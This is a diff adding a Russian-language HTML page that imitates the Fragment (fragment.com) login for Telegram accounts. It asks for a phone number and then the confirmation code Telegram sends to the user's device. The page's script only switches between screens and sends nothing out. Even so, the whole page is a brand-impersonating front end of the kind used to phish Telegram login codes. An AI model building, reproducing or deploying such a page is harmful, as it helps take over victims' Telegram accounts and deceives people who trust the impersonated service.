@@ -1,0 +1,226 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
+<title>Fragment</title>
+<style>
+:root{
+  --bg:#0b0b0e;
+  --panel:#111114;
+  --panel2:#0f0f13;
+  --border:#1e1e25;
+  --text:#e8e8e8;
+  --muted:#8b8b8b;
+  --accent:#ffffff;
+  --ok:#5cff9b;
+}
+*{box-sizing:border-box}
+html,body{height:100%}
+body{
+  margin:0;
+  background:var(--bg);
+  color:var(--text);
+  font-family:Inter,system-ui,-apple-system,Arial,sans-serif;
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  overflow:hidden;
+  padding: env(safe-area-inset-top) env(safe-area-inset-right) env(safe-area-inset-bottom) env(safe-area-inset-left);
+}
+.logo{
+  position:fixed;
+  top:18px;
+  left:22px;
+  display:flex;
+  align-items:center;
+  gap:10px;
+  opacity:0;
+  transform:translateY(-10px);
+  animation:logoFade 1s ease forwards;
+}
+.logo-img{
+  width:28px;
+  height:28px;
+  object-fit:contain;
+}
+.logo span{
+  font-size:26px;
+  font-weight:700;
+  letter-spacing:0.5px;
+  transition: color 0.3s ease;
+}
+.wrap{
+  width:100%;
+  max-width:420px;
+  padding:0 12px;
+}
+.card{
+  background:linear-gradient(180deg,var(--panel),var(--panel2));
+  border:1px solid var(--border);
+  padding:30px 24px 28px;
+  opacity:0;
+  transform:translateY(20px);
+  animation:cardFade 0.8s ease forwards 0.3s;
+  border-radius:10px;
+  transition: box-shadow 0.3s ease;
+}
+.card:hover{
+  box-shadow:0 8px 20px rgba(0,0,0,0.3);
+}
+h2{
+  margin:0 0 22px;
+  font-weight:400;
+  font-size:16px;
+  text-align:center;
+  line-height:1.5;
+}
+.field{margin-bottom:16px;position:relative;}
+input{
+  width:100%;
+  padding:14px 12px;
+  background:transparent;
+  border:1px solid var(--border);
+  color:var(--text);
+  font-size:16px;
+  transition:border 0.3s ease, box-shadow 0.3s ease;
+  border-radius:6px;
+}
+input::placeholder{color:var(--muted);}
+input:focus{
+  outline:none;
+  border-color:#2a2a35;
+  box-shadow:0 0 10px rgba(255,255,255,0.05);
+}
+button{
+  width:100%;
+  padding:14px;
+  background:var(--accent);
+  color:#000;
+  border:none;
+  font-size:15px;
+  font-weight:500;
+  cursor:pointer;
+  border-radius:6px;
+  transition:transform 0.2s ease, opacity 0.2s ease, box-shadow 0.2s ease;
+}
+button:hover,button:focus{
+  transform:scale(1.03);
+  box-shadow:0 6px 15px rgba(0,0,0,0.2);
+}
+button:active{
+  transform:scale(0.98);
+  opacity:0.9;
+}
+button[disabled]{opacity:.6;cursor:not-allowed;}
+.skeleton{display:grid;gap:10px;}
+.sk{
+  height:14px;
+  background:linear-gradient(90deg,#15151b,#1b1b23,#15151b);
+  background-size:200% 100%;
+  animation:shimmer 1.2s infinite;
+}
+.sk.w70{width:70%}
+.sk.h44{height:44px}
+.loader{
+  display:flex;
+  justify-content:center;
+  gap:6px;
+  margin-top:6px;
+}
+.dot{
+  width:6px;height:6px;border-radius:50%;
+  background:var(--text);
+  animation:bounce 1.2s infinite ease-in-out;
+}
+.dot:nth-child(2){animation-delay:.15s}
+.dot:nth-child(3){animation-delay:.3s}
+.success{
+  display:flex;
+  flex-direction:column;
+  align-items:center;
+  gap:12px;
+  animation:fadeUp .5s ease forwards;
+}
+.check{
+  width:36px;height:36px;border-radius:50%;
+  border:2px solid var(--ok);
+  display:grid;place-items:center;
+}
+.check svg{width:18px;height:18px}
+.hidden{display:none}
+@keyframes logoFade{to{opacity:1;transform:translateY(0)}}
+@keyframes cardFade{to{opacity:1;transform:translateY(0)}}
+@keyframes shimmer{0%{background-position:0 0}100%{background-position:200% 0}}
+@keyframes bounce{0%,80%,100%{transform:scale(0)}40%{transform:scale(1)}}
+@keyframes fadeUp{from{opacity:0;transform:translateY(8px)}to{opacity:1;transform:none}}
+@media (max-width:420px){h2{font-size:15px;line-height:1.4}}
+</style>
+</head>
+<body>
+<div class="logo">
+  <img src="frag/photo.png" alt="Fragment" class="logo-img">
+  <span>Fragment</span>
+</div>
+<div class="wrap">
+  <div class="card">
+    <div id="step1">
+      <h2>Войдите, чтобы использовать аккаунт<br>
+Telegram<br>
+для fragment.com и Fragment Auction Alerts<br>
+Введите свой номер телефона в международном формате.<br>
+Подтверждение будет отправлено в приложение Telegram на вашем устройстве</h2>
+      <div class="field">
+        <input id="phone" placeholder="+79991234567" inputmode="tel">
+      </div>
+      <button id="go1">Продолжить</button>
+    </div>
+    <div id="loading" class="hidden">
+      <div class="skeleton">
+        <div class="sk w70"></div>
+        <div class="sk h44"></div>
+        <div class="sk h44"></div>
+      </div>
+      <div class="loader">
+        <div class="dot"></div><div class="dot"></div><div class="dot"></div>
+      </div>
+    </div>
+    <div id="step2" class="hidden">
+      <h2>Введите код</h2>
+      <div class="field">
+        <input id="code" placeholder="Код" inputmode="numeric">
+      </div>
+      <button id="go2">Подтвердить</button>
+    </div>
+    <div id="done" class="hidden success">
+      <div class="check">
+        <svg viewBox="0 0 24 24" fill="none">
+          <path d="M6 12l4 4 8-8" stroke="#5cff9b" stroke-width="2" stroke-linecap="round"/>
+        </svg>
+      </div>
+      <div>Готово!</div>
+    </div>
+  </div>
+</div>
+<script>
+const step1=document.getElementById('step1')
+const step2=document.getElementById('step2')
+const loading=document.getElementById('loading')
+const done=document.getElementById('done')
+document.getElementById('go1').onclick=()=>{
+  if(!document.getElementById('phone').value.trim())return
+  step1.classList.add('hidden')
+  loading.classList.remove('hidden')
+  setTimeout(()=>{
+    loading.classList.add('hidden')
+    step2.classList.remove('hidden')
+  },1400)
+}
+document.getElementById('go2').onclick=()=>{
+  if(!document.getElementById('code').value.trim())return
+  step2.classList.add('hidden')
+  done.classList.remove('hidden')
+}
+</script>
+</body>
+</html>
